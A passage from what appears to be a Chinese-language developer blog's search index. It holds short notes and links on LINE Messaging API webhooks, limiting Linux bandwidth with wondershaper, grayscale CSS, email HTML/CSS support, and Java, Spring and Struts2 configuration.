LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"建議要使用同一組帳號開發 不同人的建立 Line project 的時候，同一個人產生的 userid 會不一樣。 但是同一個建的多個 project 會產生相同的 userid。 再串接上比較不會 ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:1:0","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"webhook push reply follow unfollow webhook ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:2:0","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"注意事項 驗證憑證 Messaging API reference | LINE Developers ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:2:1","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"LIFF ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:3:0","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"注意事項 token 關掉註銷 email 權限 Integrating LINE Login with your web app | LINE Developers # Applying for email permission 開發LINE聊天機器人不可不知的十件事 - LINE ENGINEERING LINE Bot 系列文 — 什麼是 Webhook? - Justin Lee - Medium 21CS學習網 ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:3:1","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"測試內網對外 API 工具 ngrok localtunnel 用 localtunnel 幫 chatbot 上 https | 筆記國度 ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:4:0","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["LINE"],"content":"表情符號 舊版使用特殊文字產生表情符號 LINE BOT の emoticon の説明がよく分からなかったのでリストにしました。 - Qiita 新版 [Golang][LINE][教學] 如何傳送 LINE 專屬的表情符號(emoji) 關於 LINE Emoji 的一些細節（以 Golang 為例) - LINE ENGINEERING 老實說，我覺得舊版還是比較方便…. ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:5:0","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 LIFF 小記","uri":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近發現動物機上傳速度高的話 容易造成別台機器網頁不能看(timeout) 原本想用中華電信小烏龜設定Qos 但好像沒有效果 網路上有看到 Linux 控制連線速度 ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:0:0","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"wondershaper # 以下不能做，不要執行 sudo apt install wondershaper # 使用 apt 安裝執行會出現 # Please read the man page for the wondershaper and # the file /usr/share/doc/wondershaper/README.Debian.gz …but as of Ubuntu 18.04LTS, the packaged wondershaper does not work correctly out of the box so you have to go direct to the github repo from magnific0 好像…，apt 裝完不能用 wget https://github.com/magnific0/wondershaper/archive/master.zip -c -O wondershaper-tmp.zip \u0026\u0026 unzip -o wondershaper-tmp.zip \u0026\u0026 rm wondershaper-tmp.zip \u0026\u0026 cd wondershaper-master \u0026\u0026 sudo make install ; cd .. \u0026\u0026 rm -rf wondershaper-master 其實這些指令是抓檔案下來、解壓縮、刪除壓縮檔進去目錄，安裝程式完便刪除。 參考:Linux 如何使用wondershaper來限制網路頻寬？ | MagicLen ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:1:0","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"如何移除 因為使用 make install 安裝 所以不知道怎麼移除 到 wondershaper-master 做 sudo make uninstall If I build a package from source how can I uninstall or remove completely? - Ask Ubuntu pi@raspberrypi:~/wondershaper-master $ sudo make uninstall rm -f /usr/sbin/wondershaper; rm -f /usr/lib/systemd/system/wondershaper.service; rm -f /etc/conf.d/wondershaper.conf; ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:1:1","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"使用方法 MODES: wondershaper -a \u003cadapter\u003e -d \u003crate\u003e -u \u003crate\u003e wondershaper -c -a \u003cadapter\u003e wondershaper -s -a \u003cadapter\u003e EXAMPLES: wondershaper -a eth0 -d 1024 -u 512 wondershaper -a eth0 -u 512 wondershaper -c -a eth0 記得輸入過的 wondershaper 的 interface 要重設速度 要做 wondershaper -c -a \u003cinterface\u003e ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:1:2","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"算傳輸速度 Convert Kbps to megabyte/second - Conversion of Measurement Units EX 限制 2mb 換算 Kbps 16000 公式:大概 1mb = 8000kbps 但我應該是記不住，靠電腦算就好了XD ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:2:0","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"設定服務 重開機就會清除之前設定 他其實你打的指令也不會記錄 主要會吃/etc/systemd/wondershaper.conf 所以要改在這裏面 # 啟用 service sudo systemctl enable wondershaper.service # 停用 service sudo systemctl disable wondershaper.service 奇怪，那我要設定多個 interface 要怎麼辦 我後來查都查不到 看到Traffic management with WonderShaper [Documentation - Online.net] /usr/lib/systemd/system/wondershaper.service [Unit] Description=Bandwidth shaper/Network rate limiter After=network.target Wants=network.target [Service] Type=oneshot RemainAfterExit=yes EnvironmentFile=/etc/systemd/wondershaper.conf ExecStart=/usr/bin/wondershaper -a $IFACE -d $DSPEED -u $USPEED ExecStop=/usr/bin/wondershaper -c -a $IFACE [Install] WantedBy=multi-user.target 其實看 ExecStart ，只會幫你帶入一個 感覺能透過 EnvironmentFile 加參數 透過 ExecStart 和 ExecStop 實現多個 interface 操作 linux服務器使用WonderShaper進行網絡速度限制 – WONGCW 網誌 ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:2:1","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Trickle Trickle 我就不研究了 【系統】Ubuntu : 限制網路頻寬 @ Ching Wei : This is My Life - 工作、攝影、旅遊 :: 痞客邦 :: Linux下使用Trickle限制下載上傳帶寬 - 每日頭條 Linux 如何使用wondershaper來限制網路頻寬？ | MagicLen ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:3:0","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"iptable + tc 感覺 wondershaper 是用 tc 但我看不懂 tc 設定 wondershaper 是一個易用的流量限制腳本. 該腳本提供了以下改進: 降低交互流量時的延遲時間 允許上傳/下載的同時保留適當的 Web 瀏覽速度 確保上傳不會影響到下載 確保下載不會影響到上傳 Wondershaper流量監控工具 - Ubuntu中文 程式扎記: [Linux 文章收集] TC 入門 (traffic control) 使用iptables和tc对端口限速 - 行木辛 - 博客园 关于 iptables 和 tc 的限速理解 - 线上猛如虎，线下怂如鼠（WhyNotBetter） - SegmentFault 思否 [Linux] TC(traffic control)流量控制實作筆記(1) iptables 限速 - 哈希 ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:4:0","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"其他工具 爬到linux的traffic control@小鸟技术笔记有很多工具 dummynet dummynet通過創建pipe接管指定的報文，對其進行整型。 利用Dummynet模拟恶劣网络环境_运维_baidu_zhongce的博客-CSDN博客 其他惡劣環境方法: 模拟恶劣网络环境常用的几种解决方案 - 狂师 - 博客园 如何模拟弱网测试 - 尚码园 Linux模拟复杂网络环境下的传输（netem和tc） - 哈希 之前有在想要怎麼創造很糟網路環境，剛好看到這篇 pyshaper pyshaper是一個帶有gui的限速工具。 ","date":"2020-04-05","objectID":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/:5:0","tags":["linux","限速"],"title":"Linux 限制網路速度方法","uri":"/blog/posts/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"單純紀錄 filter: grayscale(100%); html body \u003c!DOCTYPE html\u003e \u003chtml style=\"filter: grayscale(100%);\"\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width\"\u003e \u003ctitle\u003eJS Bin\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e test \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e body{ background: url('https://cache.cswsadlab.com/wp-content/uploads/2015/08/16_bg_noise_scale.jpg') no-repeat center center /cover; } 哀悼日网站全站变灰CSS代码 - 严颖专栏 - SegmentFault 思否 ","date":"2020-04-04","objectID":"/blog/posts/%E7%B6%B2%E7%AB%99%E5%93%80%E5%BC%94%E7%81%B0%E9%9A%8E-CSS-%E6%96%B9%E6%B3%95/:0:0","tags":["css"],"title":"網站哀弔灰階 CSS 方法","uri":"/blog/posts/%E7%B6%B2%E7%AB%99%E5%93%80%E5%BC%94%E7%81%B0%E9%9A%8E-CSS-%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"最近接到簡單的任務 修改 E-mail 排版 就是縮排的問題 但由於我對 Outlook 支援性不是很清楚 一個一個試感覺不是很方便 有找到幾個網址可以查 ","date":"2020-04-02","objectID":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/:0:0","tags":["email","html","css"],"title":"Email 支援 HTML 和 CSS 查詢方法","uri":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"查詢網站 ","date":"2020-04-02","objectID":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/:1:0","tags":["email","html","css"],"title":"Email 支援 HTML 和 CSS 查詢方法","uri":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"HTML Email HTML tags \u0026 attributes ignored by Outlook Can I email… Support tables for HTML and CSS in emails ","date":"2020-04-02","objectID":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/:1:1","tags":["email","html","css"],"title":"Email 支援 HTML 和 CSS 查詢方法","uri":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"CSS CSS Support Guide for Email Clients [+Checklist] | Campaign Monitor Email Client CSS Support | Email Design Reference ","date":"2020-04-02","objectID":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/:1:2","tags":["email","html","css"],"title":"Email 支援 HTML 和 CSS 查詢方法","uri":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"其他 神奇的樣版引擎套 email 的 html + css MJML - The Responsive Email Framework ","date":"2020-04-02","objectID":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/:1:3","tags":["email","html","css"],"title":"Email 支援 HTML 和 CSS 查詢方法","uri":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"處理空白問題 不知道再存文字寄送的時候，Outlook 收信時候不會轉空白字元 我在程式外面加 pre html tag就能看到縮排 另外一種方式全部轉成 HTML 【译】使用 标签样式的注意事项 - 奇舞团博客 vb6 - HTML blank spaces in email - Stack Overflow 改變 ol li 寫法 html - Can ordered list produce result that looks like 1.1, 1.2, 1.3 (instead of just 1, 2, 3, …) with css? - Stack Overflow ","date":"2020-04-02","objectID":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/:2:0","tags":["email","html","css"],"title":"Email 支援 HTML 和 CSS 查詢方法","uri":"/blog/posts/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"TODO: 尚未整理完成 The 2020 Java Developer RoadMap Top 20 Libraries and APIs Java Developer should know ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:0:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Exception Java筆記 — Exception 與 Error - Carl - Medium ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:1:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"io close Java：浅谈InputStream的close方法 - 白羊沈歌 - 博客园 Java OutputStream.close()关闭并释放输出流资源 Snailclimb/JavaGuide: 【Java学习+面试指南】 一份涵盖大部分Java程序员所需要掌握的核心知识。 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:2:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Memory-mapped File Java中Stream和Memory-mapped File的I/O性能对比 - Xavier’s Blog ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:2:1","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"stack /heap 記憶體相關 (1) Java技術與認證交流平台 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:2:2","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Java Web ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:3:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Session JSP Session | 菜鸟教程 每一個 war 檔 session 都是分開的，可用上面 JSP 測試 L316476844/distributed-session: 集群/分布式环境Session的几种策略 实现步骤和方式 1、粘性session 2、应用服务器间的session复制共享 3、基于cache DB缓存的session共享 跨war包session同步_数据库_阳光下的立人-CSDN博客 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:3:1","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"spring core 介绍 | 走心的Java Web入门开发教程 開源框架: Spring Gossip ApplicationContext 与 BeanFactory 区别 - 掘金 Spring Container | securenai SITE 備份圖 Spring第一篇【介绍Spring、引入Spring、Spring六大模块】 - 掘金 什么是面向切面编程AOP？ - 知乎 Spring|@Autowired与new的区别 - 无聊的三文鸡 - 博客园 autowired 動態 java - how to use ‘@Qualifier’ dynamically specifying parameters? - Stack Overflow spring - 如何使用运行时“限定符”变量动态注入服务？ - IT工具网 autowired 常見錯誤 Autowired · Brian的雜記 @Autowired和static的关系 - 左手程序，右手诗 - 博客园 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:4:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Class com.google.gson.annotations.Expose GSON 《Android》『JSON \u0026 GSON』- GSON 的基本程式語法教學 (下) - 賽肥膩膩の食旅生活誌 JAVA IO 無邊界的想像力: Java SE 入門教學 - IO 流 java读取文件API速度对比_Java_fengxingzhe001的专栏-CSDN博客 Java讀取寫出檔案FileReader和FileWriter | CYL菜鳥攻略 - 點部落 java.io.BufferedWriter java.io.ByteArrayOutputStream java.io.FileInputStream java.io.FileOutputStream java.io.IOException java.io.PrintWriter java.io.Serializable java.io.Writer java.io.File 要曲檔名 file.getName 路徑 file.getPath 會包含檔名 要怎麼曲資料夾路徑 java - How do I get a file’s directory using the File object? - Stack Overflow File.getParent() 可能會抓到 null File file = new File(\"test.txt\"); String parent = file.getParent(); 所以推薦 parent = file.getAbsoluteFile().getParent(); Path Java NIO之擁抱Path和Files | 程式前沿 File file = new File(\"C:/my.ini\"); Path p1 = file.toPath(); p1.toFile(); file.toURI(); MATH java.math.BigDecimal ip java.net.InetAddress InetAddress (Java Platform SE 7 ) InetAddress 類別 利用Java獲得IP地址 @ Java 咖啡 :: 隨意窩 Xuite日誌 處理時間格式 java.text.SimpleDateFormat Java：日期時間格式化輸出入處理：Date、Calendar、SimpleDateFormat @ 符碼記憶 java.util Contains the collections framework, legacy collection classes, event model, date and time facilities, internationalization, and miscellaneous utility classes (a string tokenizer, a random-number generator, and a bit array). java.util.ArrayList java.util.Calendar java.util.Collections java.util.Date java.util.HashMap java.util.HashSet java.util.LinkedHashMap java.util.List java.util.Map java.util.Set java.util.UUID javax.crypto.IllegalBlockSizeException JAVA实现AES加密-云栖社区-阿里云 javax.persistence Java Persistence is the API for the management for persistence and object/relational mapping. javax.persistence.Column javax.persistence.Entity javax.persistence.FetchType javax.persistence.GeneratedValue javax.persistence.GenerationType javax.persistence.Id javax.persistence.JoinColumn javax.persistence.ManyToOne javax.persistence.SequenceGenerator javax.persistence.Table javax.persistence.Temporal javax.persistence.TemporalType javax.servlet.http.HttpServletRequest javax.servlet.http.HttpServletResponse net.sf.json.JSONObject JSON用法—net.sf.json.JSONObject_Java_午夜阳光-CSDN博客 org.apache.commons.io.FileUtils org.apache.commons.io.FileUtils 详解_Java_蚩尤后裔-CSDN博客 Apache Commons工具集简介 - 坚持学习 - ITeye博客 org.apache.commons.lang.builder.ToStringBuilder org.apache.commons.lang.builder.ToStringStyle org.apache.commons.lang.StringUtils Commons Lang使用ToStringBuilder - 就是愛Java [Java基础]StringUtils.join()方法与String.join()方法的使用_Java_YuanMxy’Home-CSDN博客 org.apache.commons.io.IOUtils java - Should I close the InputStream of org.apache.commons.io.IOUtils - Stack Overflow Javalogy–Java的學習筆記: Commons Logging org.apache.commons.logging.Log org.apache.commons.logging.LogFactory org.apache.log4j.Logger Apache POI超鏈接 - POI基礎教程 org.apache.poi.ss.usermodel.Row org.apache.poi.xssf.usermodel.XSSFRow org.apache.poi.xssf.usermodel.XSSFSheet org.apache.poi.xssf.usermodel.XSSFWorkbook org.hibernate.Query 第二個 Hibernate org.junit.runner.RunWith org.junit.Test JUnit 5和JUnit 4比较_Java_javaZhong的博客-CSDN博客 使用 JUnit 4.x org.springframework.beans.BeanUtils Spring 中的BeanUtils与apache中的BeanUtils差别_Java_langqiao123的专栏-CSDN博客 org.springframework.beans.factory.annotation.Autowired IoC - Annotation (@Autowired) - 史帝芬心得筆記 org.springframework.beans.factory.annotation.Qualifier 详解@Autowired、@Qualifier和@Required_Java_Benjamin-CSDN博客 org.springframework.context.support.AbstractApplicationContext org.springframework.context.support.ClassPathXmlApplicationContext Spring 入门学习二之IOC - 个人文章 - SegmentFault 思否 org.springframework.stereotype.Repository org.springframework.stereotype.Service SSM简单整合教程\u0026测试事务 - 东北小狐狸 - 博客园 Day 8 Spring MVC-@Service的使用 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 org.springframework.test.context.ContextConfiguration Sprin g整合 JUnit4 测试时，使用 @ContextConfiguration 注解引入多个配置文件_Java_HeatDeath的博客-CSDN博客 org.springframework.test.context.junit4.SpringJUnit4ClassRunner org.springframework.transaction.annotation.Propagation Spring中@Transactional用法詳細介紹 | 程式前沿 org.spring","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:5:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Struts ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:6:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"詳細教學 Struts2第二篇【开发步骤、执行流程、struts - 掘金 Struts2第三篇【Action开发方式、通配符、Struts常量、跳转全局视图、action节点默认配置】 - 掘金 Spring第四篇【Intellij idea环境下、Struts2和Spring整合】 - 掘金 Struts2第五篇【类型转换器、全局、局部类型转换器】 - 掘金 Struts2第六篇【文件上传和下载】 - 掘金 Struts2第七篇【介绍拦截器、自定义拦截器、执行流程、应用】 - 掘金 Struts第八篇【资源国际化、对比JSP的资源国际化】 - 掘金 Struts2第九篇【OGNL、valueStack详解】 - 掘金 Struts2第十一篇【简单UI标签、数据回显】 - 掘金 Struts2第十二篇【模型驱动】 - 掘金 Struts2第十三篇【防止表单重复提交拦截器】 - 掘金 Struts2入门这一篇就够了 - 掘金 Struts2的配置 struts.xml Action詳解 | 程式前沿 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:6:1","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"數據封裝 struts2 最近使用發現他在表單傳送 input 值真的很方便 只要對 Java 做 getXxxx , setXxxx (動態) 就能做很多設定 後來查到這名詞是數據封裝 有很多種方式很已做到 詳細如:struts2(二) 表单参数自动封装和参数类型自动转换 - 漂泊在外的程序员老王 - 博客园 struts2转换器详解_Java_xtayfjpk的专栏-CSDN博客 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:6:2","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"struts.xml Struts2配置文件【代码库】 - 掘金 7、struts.xml配置详解 - 暗夜亡灵 - 博客园 Struts 2 result详解 - 簡書 java - How to return HTTP error status code and content in Struts2 - Stack Overflow(未測試) 菜鸟学Struts2——Results - 92年程序员 - 博客园 最佳程式路徑 曾經第一次接觸使用 strut2 我常用 XML 設定如下 \u003cpackage name=\"vvvv\" namespace=\"/vvvv\" extends=\"struts-default\"\u003e \u003caction name=\"insertStock\" method=\"doInsertStock\" class=\"vvvv.action.Stock\"\u003e \u003cresult name=\"success\"\u003e/vvvv/pages/stock_update.jsp\u003c/result\u003e \u003cresult name=\"error\"\u003e/vvvv/pages/stock_insert.jsp\u003c/result\u003e \u003c/action\u003e \u003caction name=\"addStock\" method=\"doAddStock\" class=\"vvvv.action.Stock\"\u003e \u003cresult name=\"success\"\u003e/vvvv/pages/stock_insert.jsp\u003c/result\u003e \u003c/action\u003e ... 通常一個 class 跟 method 對應一個設定 但我發現 xml 的 action method 設定不一定要放(預設是 execute) 每一個 method 不一定需要設定 不一定要放多個 tag 如範例 只要設定一個 action 就能做到了 可參考下面設定 \u003caction name=\"oooo\" class=\"com.oooo.action.XxxxAction\"\u003e \u003cresult name=\"success\"\u003e/ooooo/oooo/success.jsp\u003c/result\u003e \u003cresult name=\"list\"\u003e/ooooo/oooo/query.jsp\u003c/result\u003e \u003cresult name=\"edit\"\u003e/ooooo/oooo/edit.jsp\u003c/result\u003e \u003c/action\u003e 其他，看到優良設定 \u003cpackage name=\"user\" namespace=\"/\" extends=\"struts-default\"\u003e \u003caction name=\"*user\" class=\"com.zzjmay.action.VaildateAction\" method=\"{1}\"\u003e \u003cresult name=\"success\"\u003e/success.jsp\u003c/result\u003e \u003cresult name=\"input\"\u003e/{1}.jsp\u003c/result\u003e \u003c/action\u003e \u003c/package\u003e name:邏輯上的包名 namespace:名稱空間，用來區分同意struts下的相同action（注意是一種邏輯上的的路徑） extends: 繼承某個配置檔案 abstract name:Action類的對映名稱 class:Action類的完整路徑 method:預設使用的execute()方法，如果要自定義觸發方法，需要使用method自定義 Struts2的配置 struts.xml Action詳解 | 程式前沿 還有更彈性設定 \u003caction name=\"user_*_*\" method=\"user{2}\" class=\"com.gopain.{1}\"\u003e \u003cresult name=\"type_{2}\"\u003e/{2}_page.jsp\u003c/result\u003e \u003c/action\u003e 假如請求為，user_UserAction_login（不考慮namespace），其中 action中{1} 為UserAction，{2}為login，此請求會執行com.gopain.UserAction$userlogin().如果返回值為」type_login「,則會跳轉到login_page.jsp頁面。 此處只是舉例，站點不宜這樣配置請求。但是對於action的name配置很實用，不要奢望一個action配置完整個站點（雖然也可以實現，而且對於訪問沒有太多影響），十分不利於管理。 ———————————————— 版权声明：本文为CSDN博主「gopain」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/gopain/java/article/details/40790523 參考:[Struts2] 